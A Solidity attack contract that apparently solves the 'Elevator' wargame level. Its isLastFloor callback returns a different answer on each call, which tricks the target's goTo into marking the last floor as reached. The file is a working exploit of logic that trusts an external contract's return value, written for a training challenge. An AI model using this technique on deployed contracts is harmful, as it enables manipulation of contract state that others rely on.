pragma solidity ^0.8.20;

import {Building} from "../../src/levels/Elevator.sol";
import {Script} from "forge-std/Script.sol";

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttack is Building {
    IElevator private externalContract;
    bool isLast = true;

    constructor(address payable _externalContract) payable {
        externalContract = IElevator(_externalContract);
    }

    function pwn() external {
        externalContract.goTo(10);
    }

    function isLastFloor(uint256) external returns (bool) {
        isLast = !isLast;
        return isLast;
    }
}
